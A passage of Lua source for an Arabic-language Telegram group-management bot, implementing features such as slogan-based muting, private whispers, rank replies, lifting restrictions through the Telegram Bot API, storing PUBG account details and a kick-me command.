faederdx(msg.chat_id_, msg.id_, 1, '↫ لم يتم تعيين القناة ', 1, 'md')
end end end
--     By Developer Faeder     --
if text == "وضع شعار" or text == "ضع شعار" then 
faederdx1:set("tt:add1"..bot_id..msg.chat_id_..msg.sender_user_id_,"Faeder")
faederdx(msg.chat_id_, msg.id_, 1, "↫ ارسل لي الشعار الان", 1, 'md')
return "Faeder"
end
if faederdx1:get("tt:add1"..bot_id..msg.chat_id_..msg.sender_user_id_) then 
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم تعيين : { "..text.." }", 1, 'md')
faederdx1:del("tt:add1"..bot_id..msg.chat_id_..msg.sender_user_id_)
faederdx1:set("tohd1"..bot_id..msg.chat_id_,text)
end
if text == "تعين عدد الكتم" or text == "تعيين عدد الكتم" or text == "ضع عدد الكتم" or text == "وضع عدد الكتم" then
faederdx(msg.chat_id_, msg.id_, 1, " ↫ ارسل لي عدد الكتم", 1, 'md')
faederdx1:set("tt:add12"..bot_id..msg.chat_id_..msg.sender_user_id_,"Faeder")
return "Faeder"
end
if faederdx1:get("tt:add12"..bot_id..msg.chat_id_..msg.sender_user_id_) then 
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم تعيين : { "..text.." } عدد لكتم العضو", 1, 'md')
faederdx1:del("tt:add12"..bot_id..msg.chat_id_..msg.sender_user_id_)
faederdx1:set("tohd"..bot_id..msg.chat_id_,text)
end  
if text == "تفعيل الشعار" then 
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم تفعيل الشعار", 1, 'md')
faederdx1:set("tohd1_Dx"..bot_id..msg.chat_id_,"Dx")
end
if text == "تعطيل الشعار" then 
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم تعطيل الشعار", 1, 'md')
faederdx1:del("tohd1_Dx"..bot_id..msg.chat_id_)
end

if not msg.forward_info_  then
if faederdx1:get("tohd1_Dx"..bot_id..msg.chat_id_) and faederdx1:get("tohd1"..bot_id..msg.chat_id_) then 
id = msg.sender_user_id_
function Faeder_FaederDx(FaederDx1,FaederDx2)
if FaederDx2 and FaederDx2.first_name_ then 
if FaederDx2.first_name_:match("(.*)"..faederdx1:get("tohd1"..bot_id..msg.chat_id_).."(.*)") then 
faederdx1:srem('FaederDx:'..bot_id..'muted:'..msg.chat_id_, msg.sender_user_id_)
else
local FaederDx_F = faederdx1:get("tohd"..bot_id..msg.chat_id_) or 5
local FaederDx_F2 = faederdx1:get("tohd22"..bot_id..msg.chat_id_..msg.sender_user_id_) or 0
if (tonumber(FaederDx_F2) == tonumber(FaederDx_F) or tonumber(FaederDx_F2) > tonumber(FaederDx_F)) then 
faederdx1:sadd(FAEDER..'bot:muted:'..msg.chat_id_, msg.sender_user_id_)
else
faederdx1:incrby("tohd22"..bot_id..msg.chat_id_..msg.sender_user_id_,1)
faederdx(msg.chat_id_, msg.id_, 1, "↫ عزيزي  ["..FaederDx2.first_name_.."](https://t.me/"..(FaederDx2.username_ or "Faeder_ch")..")\n↫ عليك وضع الشعار  { `"..faederdx1:get("tohd1"..bot_id..msg.chat_id_).."` } بجانب اسمك\n↫ عند انتهاء المحاولات سيتم كتمك\n\n↫ عدد المحاولات المتبقيه {"..(tonumber(FaederDx_F) - tonumber(FaederDx_F2)).."}", 1, 'md')
end end end end
getUser(id, Faeder_FaederDx)
end end 
--     By Developer Faeder     -- 
local msg = data.message_
text = msg.content_.text_ 
if not faederdx1:get(FAEDER..'TFF'..msg.chat_id_) then
if text and text:match("^اهمس (.*) (.*)") then 
text = text:gsub('@',"")
faed_dx = {string.match(text, "اهمس (.*) (.*)")}
function hamss(res1,res2)
if not res2.id_ then 
faederdx(msg.chat_id_, msg.id_, 1, '↫ المعرف غير صحيح ', 1, 'html')
return "dx"
end
function hamssss(ress1,ress2)
if (ress2 and ((ress2.status_ and ress2.status_.ID == "ChatMemberStatusLeft") or ress2.ID == "Error")) then 
faederdx(msg.chat_id_, msg.id_, 1, '↫ العضو غير موجود بالمجموعه ', 1, 'html')
return "dx"
end
tdcli_function ({
ID="DeleteMessages",
chat_id_= msg.chat_id_,
message_ids_= {[0] = msg.id_}
}, 
dl_cb, nil)
faederdx1:set(FAEDER.."HM:"..msg.chat_id_..msg.id_..res2.id_,faed_dx[1])
function bot_id_get(ros1,ros2)
bot_username = (ros2.username_ or "DX_XBOT")
function Dxx(ross1,ross2)
local hms = msg.sender_user_id_
if ross2.username_ then 
hms = "@"..ross2.username_
end
faederdx(msg.chat_id_, msg.id_, 1, "↫ هذه همسه سريه الى { @["..faed_dx[2].."] }\n↫ مرسله من { ["..hms.."] }\n↫ هو فقط من يستطيع رويتها\n↫ [اضغط هنا لعرض الهمسه](https://t.me/"..bot_username.."?start=hms"..msg.chat_id_..msg.id_.."_"..res2.id_..") •", 1, 'md')
end
getUser(msg.sender_user_id_, Dxx)
end
getUser(bot_id, bot_id_get)
end
tdcli_function ({
ID = "GetChatMember",
chat_id_ = msg.chat_id_,
user_id_ = res2.id_
}, hamssss, nil)
end
resolve_username(faed_dx[2],hamss) 
end end
--     By Developer Faeder     -- 
if text and text == "اهمس" or text and text == "همسه" or text and text == "اريد بوت الهمسه" or text and text == "دزلي بوت الهمسه" or  text and text == "دزولي بوت الهمسه" and faeder11(msg) then  
faederdx(msg.chat_id_, msg.id_, 1, '↫ يمكنك من خلال هذا البوت\n↫ ارسال همسه سريه للاعضاء \n↫ الامر كالاتي مثال : اهمس هلو [@bzzzw]', 1, 'md')
end
if text and text:match("/start hms(.*)_(%d+)") then 
faed_dx = {string.match(text, "^/start hms(.*)_(%d+)")}
if tonumber(msg.sender_user_id_) == tonumber(faed_dx[2]) then 
Faeder = faederdx1:get(FAEDER.."HM:"..faed_dx[1]..faed_dx[2])
if Faeder then 
faederdx(msg.chat_id_, msg.id_, 1, '↫ الهمسه هي\n↫ { ['..Faeder..'] }', 1, 'md')
else 
faederdx(msg.chat_id_, msg.id_, 1, '↫ اثقل الهمسه مو لك ', 1, 'md')
end else 
faederdx(msg.chat_id_, msg.id_, 1, '↫ اثقل الهمسه مو لك ', 1, 'md')
end end
--     By Developer Faeder     -- 
if text == 'رفع المشرفين' or text == 'رفع الادمنيه' and faeder11(msg) then  
local function promote_admin(extra, result, success)  
local num = 0
local admins = result.members_  
for i=0 , #admins do   
num = num + 1
faederdx1:sadd(FAEDER..'bot:momod:'..msg.chat_id_, admins[i].user_id_)   
if result.members_[i].status_.ID == "ChatMemberStatusCreator" then  
owner_id = admins[i].user_id_  
faederdx1:sadd(FAEDER..'bot:monsh:'..msg.chat_id_,owner_id)   
end end  
faederdx(msg.chat_id_, msg.id_, 1, '\n*↫ تم رفع ('..num..') ادمنيه هنا \n↫ تم رفع منشئ المجموعه . *', 1, 'md')
end
getChannelMembers(msg.chat_id_,0, 'Administrators', 100, promote_admin)
end
--     By Developer Faeder     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text == "فحص" or text == "فحص البوت" and faeder11(msg) then
local check = https.request('https://api.telegram.org/bot'..tokenbot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..FAEDER)
local GetInfo = JSON.decode(check)
if GetInfo.ok == true then
if GetInfo.result.can_change_info == true then EDT = '✔️' else EDT = '✖️' end
if GetInfo.result.can_delete_messages == true then DEL = '✔️' else DEL = '✖️' end
if GetInfo.result.can_invite_users == true then INV = '✔️' else INV = '✖️' end
if GetInfo.result.can_pin_messages == true then PIN = '✔️' else PIN = '✖️' end
if GetInfo.result.can_restrict_members == true then BAN = '✔️' else BAN = '✖️' end
if GetInfo.result.can_promote_members == true then VIP = '✔️' else VIP = '✖️' end 
faederdx(msg.chat_id_, msg.id_, 1, '↫ شغال وصلاحياته هي \n         ───────────────\n↫ حذف الرسائل '..DEL..'\n↫ دعوة المستخدمين '..INV..'\n↫ حظر المستخدمين '..BAN..'\n↫ تثبيت الرسائل '..PIN..'\n↫ تغيير المعلومات '..EDT..'\n↫ اضافة مشرفين '..VIP..'\n         ───────────────\n↫ قناة السورس [@badboy_here]', 1, 'md')
end end end
--     By Developer Faeder     --
if text and text:match("^تغير رد المطور (.*)$") then
local Text = text:match("^تغير رد المطور (.*)$") 
faederdx1:set(FAEDER.."bot:sudo3:add"..msg.chat_id_,Text)
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم تغير رد المطور الى : "..Text, 1, 'md')
end
if text and text:match("^تغير رد منشئ الاساسي (.*)$") then
local Text = text:match("^تغير رد منشئ الاساسي (.*)$") 
faederdx1:set(FAEDER.."bot:monsh:add"..msg.chat_id_,Text)
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم تغير رد المنشئ الاساسي الى : "..Text, 1, 'md')
end
if text and text:match("^تغير رد المنشئ (.*)$") then
local Text = text:match("^تغير رد المنشئ (.*)$") 
faederdx1:set(FAEDER.."bot:monsh2"..msg.chat_id_,Text)
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم تغير رد المنشئ الى : "..Text, 1, 'md')
end
if text and text:match("^تغير رد المدير (.*)$") then
local Text = text:match("^تغير رد المدير (.*)$") 
faederdx1:set(FAEDER.."bot:owner:add"..msg.chat_id_,Text) 
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم تغير رد المدير الى : "..Text, 1, 'md')
end
if text and text:match("^تغير رد الادمن (.*)$") then
local Text = text:match("^تغير رد الادمن (.*)$") 
faederdx1:set(FAEDER.."bot:momod:add"..msg.chat_id_,Text)
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم تغير رد الادمن الى : "..Text, 1, 'md')
end
if text and text:match("^تغير رد المميز (.*)$") then
local Text = text:match("^تغير رد المميز (.*)$") 
faederdx1:set(FAEDER.."bot:vepmem:add"..msg.chat_id_,Text)
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم تغير رد المميز الى : "..Text, 1, 'md')
end
if text and text:match("^تغير رد العضو (.*)$") then
local Text = text:match("^تغير رد العضو (.*)$") 
faederdx1:set(FAEDER.."bot:member:add"..msg.chat_id_,Text)
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم تغير رد العضو الى : "..Text, 1, 'md')
end
if text == "حذف ردود الرتب" or text == "مسح ردود الرتب" then
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم حذف جميع ردود الرتب", 1, 'md')
faederdx1:del(FAEDER.."bot:sudo3:add"..msg.chat_id_)
faederdx1:del(FAEDER.."bot:monsh:add"..msg.chat_id_)
faederdx1:del(FAEDER.."bot:monsh2"..msg.chat_id_)
faederdx1:del(FAEDER.."bot:owner:add"..msg.chat_id_)
faederdx1:del(FAEDER.."bot:momod:add"..msg.chat_id_)
faederdx1:del(FAEDER.."bot:vepmem:add"..msg.chat_id_)
faederdx1:del(FAEDER.."bot:member:add"..msg.chat_id_)
end
--     By Developer Faeder     -- 
if text == 'كشف القيود' and tonumber(msg.reply_to_message_id_) > 0 and is_momod(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then 
function kshf_by_reply(extra, result, success)
if faederdx1:sismember(FAEDER..'bot:muted:'..msg.chat_id_,result.sender_user_id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
if faederdx1:sismember(FAEDER..'bot:banned:'..msg.chat_id_,result.sender_user_id_) then banned = 'محظور' else banned = 'غير محظور' end
if faederdx1:sismember(FAEDER..'bot:gban:',result.sender_user_id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
if faederdx1:sismember(FAEDER..'bot:mutedall:',result.sender_user_id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
if faederdx1:sismember(FAEDER..'tkeed:',result.sender_user_id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
faederdx(msg.chat_id_, msg.id_, 1, '↫ الحظر : '..banned..'\n↫ الكتم : '..muted..'\n↫ التقيد : '..tkeed..'\n↫ الحظر العام : '..banall..'\n↫ الكتم العام : '..muteall..'', 1, 'md') 
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kshf_by_reply) 
end
if text and text:match('^كشف القيود @(.*)') and is_momod(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then 
local username = text:match('^كشف القيود @(.*)') 
function kshf_by_username(extra, result, success)
if result.id_ then
if faederdx1:sismember(FAEDER..'bot:muted:'..msg.chat_id_,result.id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
if faederdx1:sismember(FAEDER..'bot:banned:'..msg.chat_id_,result.id_) then banned = 'محظور' else banned = 'غير محظور' end
if faederdx1:sismember(FAEDER..'bot:gban:',result.id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
if faederdx1:sismember(FAEDER..'bot:mutedall:',result.id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
if faederdx1:sismember(FAEDER..'tkeed:',result.id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
faederdx(msg.chat_id_, msg.id_, 1, '↫ الحظر : '..banned..'\n↫ الكتم : '..muted..'\n↫ التقيد : '..tkeed..'\n↫ الحظر العام : '..banall..'\n↫ الكتم العام : '..muteall..'', 1, 'md')
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ *المعرف غير صحيح*', 1, 'md')  
end
end
resolve_username(username,kshf_by_username) 
end
if text == 'رفع القيود' and tonumber(msg.reply_to_message_id_) > 0 and is_momod(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then 
function unbanreply(extra, result, success) 
if tonumber(result.sender_user_id_) == tonumber(FAEDER) then  
faederdx(msg.chat_id_, msg.id_, 1, '↫ انا البوت وليس لدي قيود', 1, 'md')  
return false  
end 
Send_Options(msg,result.sender_user_id_,"reply","↫ تم رفع قيوده")  
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
faederdx1:srem(FAEDER..'tkeed:'..msg.chat_id_,result.sender_user_id_) faederdx1:srem(FAEDER..'bot:banned:'..msg.chat_id_,result.sender_user_id_) faederdx1:srem(FAEDER..'bot:muted:'..msg.chat_id_,result.sender_user_id_)   
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),unbanreply) 
end
if text and text:match('^رفع القيود (%d+)') and Admin(msg) and faeder11(msg) then 
local user = text:match('رفع القيود (%d+)') 
if tonumber(user) == tonumber(FAEDER) then  
faederdx(msg.chat_id_, msg.id_, 1, '↫ انا البوت وليس لدي قيود', 1, 'md')  
return false  
end 
tdcli_function ({ID = "GetUser",user_id_ = user},function(arg,data) 
if data and data.code_ and data.code_ == 6 then
faederdx(msg.chat_id_, msg.id_, 1, '↫ لم استطع استخراج المعلومات', 1, 'md') 
return false  
end
Send_Options(msg,user,"reply","↫ تم رفع قيوده")  
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
faederdx1:srem(FAEDER..'tkeed:'..msg.chat_id_,user) faederdx1:srem(FAEDER..'bot:banned:'..msg.chat_id_,user) faederdx1:srem(FAEDER..'bot:muted:'..msg.chat_id_,user)   
end,nil)  
end
if text and text:match('^رفع القيود @(.*)') and is_momod(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then  
local username = text:match('رفع القيود @(.*)')  
function unbanusername(extra,result,success)  
if result and result.message_ and result.message_ == "USERNAME_NOT_OCCUPIED" then 
faederdx(msg.chat_id_, msg.id_, 1, '↫ *المعرف غير صحيح*', 1, 'md')  
return false  
end
if result and result.type_ and result.type_.channel_ and result.type_.channel_.ID == "Channel" then
faederdx(msg.chat_id_, msg.id_, 1, '↫ هذا معرف قناة وليس معرف حساب', 1, 'md') 
return false  
end
if tonumber(result.id_) == tonumber(FAEDER) then  
faederdx(msg.chat_id_, msg.id_, 1, '↫ انا البوت وليس لدي قيود', 1, 'md')  
return false  
end 
tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(arg,data) 
if data and data.code_ and data.code_ == 6 then
faederdx(msg.chat_id_, msg.id_, 1, '↫ لم استطع استخراج المعلومات', 1, 'md') 
return false  
end
Send_Options(msg,result.id_,"reply","↫ تم رفع قيوده")  
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
faederdx1:srem(FAEDER..'tkeed:'..msg.chat_id_,result.id_) faederdx1:srem(FAEDER..'bot:banned:'..msg.chat_id_,result.id_) faederdx1:srem(FAEDER..'bot:muted:'..msg.chat_id_,result.id_)   
end,nil)   
end  
resolve_username(username,unbanusername) 
end 
--     By Developer Faeder     -- 
 if is_admin(msg.sender_user_id_, msg.chat_id_) then
name_bot = (faederdx1:get('faeder:'..bot_id..'name_bot') or 'لاكس')
if text ==  ""..name_bot..' غادر' and faeder11(msg) then
chat_leave(msg.chat_id_, bot_id)
faederdx1:srem(FAEDER.."bot:groups",msg.chat_id_)
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم مغادره المجموعه وحذف بياناتها ', 1, 'md')
end end
--     By Developer Faeder     -- 
if text == 'تعطيل التحقق' and is_owner(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
faederdx(msg.chat_id_, msg.id_, 1,'\n↫  تعطيل تنبيه الدخول ', 'md')  
faederdx1:set(FAEDER.."UnKedDeleteMessage"..msg.chat_id_,"close") 
end
if text == 'تفعيل التحقق' and is_owner(msg.sender_user_id_, msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1,'\n↫  تفعيل تنبيه الدخول ', 'md')
faederdx1:set(FAEDER.."UnKedDeleteMessage"..msg.chat_id_,"open") 
end
--     By Developer Faeder     -- 
if text and text == 'تفعيل وضع حسابي' and is_owner(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
if not faederdx1:get(FAEDER..'bot:pubgacuount'..msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1,'\n↫ تم تفعيل وضع حسابي سابقا ', 'md')  
else
faederdx(msg.chat_id_, msg.id_, 1,'\n↫ تم تفعيل وضع حسابي ', 'md')
faederdx1:del(FAEDER..'bot:pubgacuount'..msg.chat_id_)
end end
if text and text == 'تعطيل وضع حسابي' and is_owner(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
if faederdx1:get(FAEDER..'bot:pubgacuount'..msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1,'\n↫ تم تعطيل وضع حسابي سابقا ', 'md') 
else
faederdx(msg.chat_id_, msg.id_, 1,'\n↫ تم تعطيل وضع حسابي ', 'md')
faederdx1:set(FAEDER..'bot:pubgacuount'..msg.chat_id_,true)
end end
--     By Developer Faeder     -- 
  if not faederdx1:get(FAEDER..'bot:pubgacuount'..msg.chat_id_) then
if (text and text == 'وضع حسابي') and faeder11(msg) then
faederdx(msg.chat_id_, msg.id_, 1,'\n↫ ارسل لي اسم حسابك  ', 'html')
faederdx1:set(FAEDER..'bot:n1'..msg.sender_user_id_..'','yes')
return false end 
local Faeder = faederdx1:get(FAEDER..'bot:n1'..msg.sender_user_id_)
if Faeder == 'yes' then
if text:match("^(.*)$") then
faederdx(msg.chat_id_, msg.id_, 1,'\n↫ تم حفظ الاسم . ✔️\n↫ ارسل ايدي حسابك \n  ', 'md')
faederdx1:set(FAEDER..'bot:n1'..msg.sender_user_id_..'','no')
faederdx1:set(FAEDER..'bot:name_acount'..msg.sender_user_id_, text)
faederdx1:set(FAEDER..'bot:n2'..msg.sender_user_id_ ,'yes')
return false end
end 
local Faeder = faederdx1:get(FAEDER..'bot:n2'..msg.sender_user_id_)
if Faeder == 'yes' then
if text:match("^(%d+)$") then
faederdx1:set(FAEDER..'bot:idacount'..msg.sender_user_id_, text)
faederdx1:set(FAEDER..'bot:n2'..msg.sender_user_id_, 'no')
local aa = [[
↫ تم حفظ ايديك ✅
↫ ارسل لي تقييمك كمثال :- 

- برونز 1 
- كولد 2
- بلاتينيوم 3
- دايموند 4 
- كراون 5 
- ايس 
- كونكر 
]]
faederdx(msg.chat_id_, msg.id_, 1, aa , 1, 'html')
faederdx1:set(FAEDER..'bot:n3'..msg.sender_user_id_, 'yes')
return false 
else 
return false end
end 
local Faeder = faederdx1:get(FAEDER..'bot:n3'..msg.sender_user_id_)
if Faeder == 'yes' then
if text:match("^برونز (%d+)$") or text:match("^كولد (%d+)$") or text:match("^بلاتينيوم (%d+)$") or text:match("^دايموند (%d+)$") or text:match("^كراون (%d+)$") or text:match("^ايس$") or text:match("^كونكر$") then
faederdx1:set(FAEDER..'bot:n3'..msg.sender_user_id_, 'no')
faederdx(msg.chat_id_, msg.id_, 1,'\n↫ تم حفظ التقييم \n↫ تم حفظ حسابك بالبوت \n  ', 'md')
faederdx1:set(FAEDER..'bot:acctear'..msg.sender_user_id_, text)
return false 
else 
faederdx(msg.chat_id_, msg.id_, 1,'\n↫ لم يتم حفظ التقييم يوجد خطأ ', 'html')
return false end
end
--     By Developer Faeder     -- 
if (text and text == 'مسح حسابي') and faeder11(msg) then
faederdx1:del(FAEDER..'bot:idacount'..msg.sender_user_id_)
faederdx1:del(FAEDER..'bot:acctear'..msg.sender_user_id_)
faederdx1:del(FAEDER..'bot:name_acount'..msg.sender_user_id_)
faederdx(msg.chat_id_, msg.id_, 1,'\n↫ تم مسح حسابك من البوت ✔️ ', 'html')
end
--     By Developer Faeder     -- 
if (text and text == 'حسابي') and faeder11(msg) then
if faederdx1:get(FAEDER..'bot:idacount'..msg.sender_user_id_)then
local n = faederdx1:get(FAEDER..'bot:idacount'..msg.sender_user_id_)
local nn = faederdx1:get(FAEDER..'bot:acctear'..msg.sender_user_id_)
local nnn = faederdx1:get(FAEDER..'bot:name_acount'..msg.sender_user_id_)
local Texting = {
'والنعم يوحش',
"تقييم بلحرام",
"مفعل هاك يبن الذينا",
"طفي الهاك اخي طفي 🤥",
"ليه ماتسمح ببجي احسن لك",
"شكلك كمبرجي",
}
local faeder_send = Texting[math.random(#Texting)]
faederdx(msg.chat_id_, msg.id_, 1,"\n↫ حسابك على الببجي \n↫ اسم حسابك {`"..nnn.."`}\n↫ ايدي حسابك {`"..n.."`}\n↫ تقييمك {`"..nn.."`}\n\n↫ {"..faeder_send.."}", 1, 'md')
else 
faederdx(msg.chat_id_, msg.id_, 1,'\n↫ لم يتم حفظ حسابك بالبوت \n↫ ارسل { وضع حسابي } ليتم حفظه .\n ', 'html')
end end end
--     By Developer Faeder     -- 
if text and (text:match("^موقعي$") and faeder11(msg) or text:match("^رتبتي$")) and faeder11(msg) then
function get_me(extra,result,success)
function formsgg(msgs) 
local faeder = ''  
if msgs < 100 then 
faeder = 'صنم' 
elseif msgs < 250 then 
faeder = 'ضعيف' 
elseif msgs < 500 then 
faeder = 'غير متفاعل' 
elseif msgs < 750 then 
faeder = 'متوسط كثر ' 
elseif msgs < 1000 then 
faeder = 'متفاعل عمري' 
elseif msgs < 2000 then
faeder = 'متفاعل استمر' 
elseif msgs < 3000 then 
faeder = 'ملك التفاعل'  
elseif msgs < 4000 then 
faeder = 'اسطوره التفاعل' 
elseif msgs < 5000 then 
faeder = 'تفاعلك نار يسطا' 
elseif msgs < 5500 then 
faeder = 'نار وشرار' 
elseif msgs < 6000 then 
faeder = 'خيالي' 
elseif msgs < 7000 then 
faeder = 'اغتصب التفاعل' 
elseif msgs < 8000 then 
faeder = 'ملك التفاعل ' 
end 
return faeder
end
if result.username_ then
username = '@'..result.username_
else
username = 'لا يوجد'
end
if result.last_name_ then
lastname = result.last_name_
else
lastname = ''
end
faederdx(msg.chat_id_, msg.id_, 1, '↫ رتبتك '..faeder_renk(msg.sender_user_id_, msg.chat_id_), 1, 'html')
end
getUser(msg.sender_user_id_,get_me)
end
--     By Developer Faeder     -- 
if text:match("^الرتبه$") and msg.reply_to_message_id_ ~= 0 and faeder11(msg) then
function rt_by_reply(extra, result, success) 
local user_info_ = faederdx1:get(FAEDER..'user:Name' .. result.sender_user_id_)
local faeder_res = user_info_
if user_info_ then
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = result.sender_user_id_},function(arg,da) 
if da.status_.ID == "ChatMemberStatusCreator" then
renk_gps = 'المنشئ'
elseif da.status_.ID == "ChatMemberStatusEditor" then
renk_gps = 'الادمن'
elseif da.status_.ID == "ChatMemberStatusMember" then
renk_gps = 'عضو'
end
if result.id_ then 
if tonumber(result.sender_user_id_) == tonumber(1769776049) then
faeder1 = 'مالك السورس  '
elseif tonumber(result.sender_user_id_) == tonumber(bot_owner) then
faeder1 = "المطور 🎖."
elseif is_sudoid(result.sender_user_id_) then
faeder1 = "مطور ثانوي"
elseif is_admin(result.sender_user_id_, msg.chat_id_) then
faeder1 = "Legend 🎖 "
elseif is_onall(result.sender_user_id_) then
faeder1 = "مدير عام "
elseif is_moall(result.sender_user_id_) then
faeder1 = "ادمن عام "
elseif is_vpall(result.sender_user_id_) then
faeder1 = "مميز عام "
elseif is_monsh(result.sender_user_id_, msg.chat_id_) then
faeder1 = "منشئ اساسي "
elseif is_monsh2(result.sender_user_id_, msg.chat_id_) then
faeder1 = "منشئ "
elseif is_owner(result.sender_user_id_, msg.chat_id_) then
faeder1 = "مدير "
elseif is_momod(result.sender_user_id_, msg.chat_id_) then
faeder1 = "ادمن "
elseif is_vipmem(result.sender_user_id_, msg.chat_id_) then
faeder1 = "عضو مميز "
elseif is_donky(result.sender_user_id_, msg.chat_id_) then
faeder1 = "بائع متجول بين القروبات"
else
faeder1 = "عضو فقط "
end end
local faeder = '*↫ اهلا بك عزيزي { '..renk_faeder(msg)..' }*\n*↫ رتبه المستخدم  { '..faeder_res..' }\n*↫ في البوت { '..faeder_renk(result.sender_user_id_, msg.chat_id_)..' }*\n*↫ في القروب { '..renk_gps..' }*\n'
faederdx(msg.chat_id_, msg.id_, 1,faeder, 1, 'md') 
end,nil) end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,rt_by_reply)
end
--     By Developer Faeder     -- 
if is_sudo(msg) then
if text == 'توجيه للكل' and tonumber(msg.reply_to_message_id_) > 0 then
function faeder(extra,result,success)
local listgp = faederdx1:smembers(FAEDER.."bot:groups")
for k,v in pairs(listgp) do
forwardMessages(v, msg.chat_id_, {[0] = result.id_}, 1)
end
local listpv = faederdx1:smembers(FAEDER.."bot:userss")
for k,v in pairs(listpv) do
forwardMessages(v, msg.chat_id_, {[0] = result.id_}, 1)
end end
local gps = faederdx1:scard(FAEDER..'bot:groups') or 0
local pvs = faederdx1:scard(FAEDER..'bot:userss') or 0
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم اذاعة رسالتك بالتوجيه \n↫ في ❨ '..gps..' ❩ مجموعه \n↫ والى ❨ '..pvs..' ❩ مشترك ', 1, 'md')
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),faeder)
end end
--     By Developer Faeder     -- 
if text:match("^(time)$") or text:match("^(الوقت)$")  and faeder11(msg) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ الساعه '..os.date("%I:%M%p")..' \n↫ التاريخ '..os.date("%Y/%m/%d")..' \n', 1, 'md')
end
--     By Developer Faeder     -- 
if text:match("^مشاهده المنشور$") and faeder11(msg) then
faederdx1:set(FAEDER..'bot:viewget'..msg.sender_user_id_,true)
faederdx(msg.chat_id_, msg.id_, 1, '↫ ارسل لي المنشور الان ', 1, 'md')
end
--     By Developer Faeder     -- 
if text:match("^اطردني$") and faeder11(msg) then
if not faederdx1:get(FAEDER.."lock_kickme"..msg.chat_id_) then
faederdx1:set(FAEDER..'yes'..msg.sender_user_id_..'', 'kickyes')
faederdx1:set(FAEDER..'no'..msg.sender_user_id_..'', 'kickno')
faederdx(msg.chat_id_, msg.id_, 1, "↫ ارسل *{ نعم }* ليتم طردك \n↫ ارسل *{ لا } *ليتم الغاء طردك ", 1, "md")
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ هذه الخاصيه معطله . ', 1, 'md')
end end
local kickme = faederdx1:get(FAEDER..'yes'..msg.sender_user_id_..'')
if kickme == 'kickyes' then
if text:match("^نعم$") then
if is_vipmem(msg.sender_user_id_, msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, "↫ لا استطيع طرد المشرفين ", 1, "md")
else
local kickme = faederdx1:get(FAEDER..'yes'..msg.sender_user_id_..'')
if kickme == 'kickyes' then
chat_kick(msg.chat_id_, msg.sender_user_id_)
faederdx1:del(FAEDER..'yes'..msg.sender_user_id_..'', 'kickyes')
faederdx1:del(FAEDER..'no'..msg.sender_user_id_..'', 'kickno')
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم طردك عزيزي ", 1, "md")
end end end
if text:match("^لا$") then
local notkickme = faederdx1:get(FAEDER..'no'..msg.sender_user_id_..'')
if notkickme == 'kickno' then
faederdx1:del(FAEDER..'yes'..msg.sender_user_id_..'', 'kickyes')
faederdx1:del(FAEDER..'no'..msg.sender_user_id_..'', 'kickno')
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم الغاء طردك ", 1, "md")
end end end
--     By Developer Faeder     -- 
if text == 'تعطيل اطردني' and is_owner(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
if not faederdx1:get(FAEDER.."lock_kickme"..msg.chat_id_) then
faederdx1:set(FAEDER.."lock_kickme"..msg.chat_id_, true)
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم تعطيل امر اطردني ', 1, 'md')
end end
if text == 'تفعيل اطردني' and is_owner(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
if faederdx1:get(FAEDER.."lock_kickme"..msg.chat_id_) then
faederdx1:del(FAEDER.."lock_kickme"..msg.chat_id_)
